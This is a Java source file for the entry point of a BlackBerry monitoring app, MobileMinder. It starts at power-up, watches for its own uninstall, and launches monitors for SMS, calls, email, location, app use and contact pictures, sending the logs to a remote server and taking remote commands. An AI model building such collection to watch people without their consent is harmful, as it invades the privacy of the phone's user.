package com.mmtechco.mobileminder;

import java.io.IOException;

import com.mmtechco.mobileminder.contacts.ContactPic;
import com.mmtechco.mobileminder.control.Commander;
import com.mmtechco.mobileminder.data.DBAccess;
import com.mmtechco.mobileminder.data.DBFactory;
import com.mmtechco.mobileminder.monitor.*;
import com.mmtechco.mobileminder.net.Server;
import com.mmtechco.mobileminder.prototypes.Controllable;
import com.mmtechco.mobileminder.prototypes.LocalDataWriter;
import com.mmtechco.mobileminder.prototypes.enums.FILESYSTEM;
import com.mmtechco.mobileminder.sync.CallSync;
import com.mmtechco.mobileminder.util.Logger;
import com.mmtechco.mobileminder.util.ToolsBB;

import net.rim.device.api.database.DatabaseIOException;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleListener;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.SystemListener2;
import net.rim.device.api.ui.UiApplication;

/**
 * Main entry point of the application.
 */
class MobileMinder extends UiApplication implements SystemListener2 {
	private static final String TAG = "App";
	private static MobileMinder app;

	private LocalDataWriter actLog;
	private Registration reg;
	private Logger logger = Logger.getInstance();

	public static void main(String[] args) {
		// Start logging
		// Logger.startEventLogger();

		app = new MobileMinder();

		/*
		 * if (args != null && args.length > 0 && args[0].equals("autostartup"))
		 * { // App started from autorun on startup
		 */

		// If system startup is still in progress when this
		// application is run.
		if (ApplicationManager.getApplicationManager().inStartup()) {
			// Add a system listener to detect when system is ready and
			// available.
			app.addSystemListener(app);
		} else {
			// System is already ready and available so perform start up
			// work now. Note that this work must be completed using
			// invokeLater because the application has not yet entered the
			// event dispatcher.
			app.doStartupWorkLater();
			// UiApplication.getUiApplication().pushScreen(new InfoScreen());
		}
		/*
		 * } else { // App was started from icon click
		 * Logger.getInstance().log(TAG, "Started from icon click");
		 * app.doStartupWorkLater();
		 * UiApplication.getUiApplication().pushScreen(new InfoScreen()); }
		 */

		// Listen for removal of app
		CodeModuleManager.addListener(app, new UninstallMonitor());

		// Start event thread
		app.enterEventDispatcher();
	}

	// Spawn the controller which takes care of execution of everything else.
	private void doStartupWork() {
		// Timer values
		final int locTime = 29000;
		final int appTime = 31000;
	
		logger.log(TAG, "Starting registration");
		reg = new Registration();
		reg.start();
		
		// Wait until registration has processed
		try {
			while (!reg.isRegistered()) {
				logger.log(TAG, "Waiting for registration to process");
				Thread.sleep(10000);
			}
		} catch (InterruptedException e) {
			e.printStackTrace();
		}

		// Open database
		try {
			actLog = DBFactory.getLocalDataWriter();
		} catch (IOException e) {
			logger.log(TAG,
					"Device has no storage that is can be written to by DB. Alerting user.");
			return;
			// TODO: pop dialog to user
		}
		try {
			actLog.open();
		} catch (DatabaseIOException e) {
			e.printStackTrace();
			logger.log(TAG, "fs could not access db");
			return;
		}

		// Start call sync. Note that there is no faculty to access existing SMS
		// messages stored on the device.
		new CallSync(new Server(actLog)).start();

		// Start monitors
		logger.log(TAG, "Starting monitors...");
		new AppMonitor(actLog, appTime);
		new LocationMonitor(actLog, locTime);
		new MailMonitor(actLog);

		Controllable[] components = new Controllable[3];
		components[0] = new SMSMonitor(actLog);
		components[1] = new CallMonitor(actLog);
		components[2] = new ContactPic(actLog);
		// components[3] = new MediaSync(actLog);
		new Commander(actLog, components).start();

		// Monitor activity log
		new Server(actLog).start();
	}

	/**
	 * Perform the start up work on a new Runnable using the invokeLater
	 * construct to ensure that it is executed after the event thread has been
	 * created.
	 */
	private void doStartupWorkLater() {
		invokeLater(new Runnable() {
			public void run() {
				doStartupWork();
			}
		});
	}

	public void powerUp() {
		removeSystemListener(this);
		// Wait 30 seconds for sdcard to mount
		for (int i = 0; i < 30; i++) {
			if (ToolsBB.fsMounted(FILESYSTEM.SDCARD)) {
				break;
			}
			try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		Logger.getInstance().log(TAG, "Started from powerup");
		doStartupWork();
	}

	public void powerOff() {
		DBAccess.close();
	}

	public void rootChanged(int state, String rootName) {
		// TODO: implement
	}

	public void backlightStateChange(boolean on) {
		// TODO: possibly restart app if crashed
	}

	public void batteryLow() {
	}

	public void batteryStatusChange(int status) {
	}

	public void cradleMismatch(boolean mismatch) {
	}

	public void fastReset() {
	}

	public void powerOffRequested(int reason) {
	}

	public void usbConnectionStateChange(int state) {
	}

	public void batteryGood() {
	}
}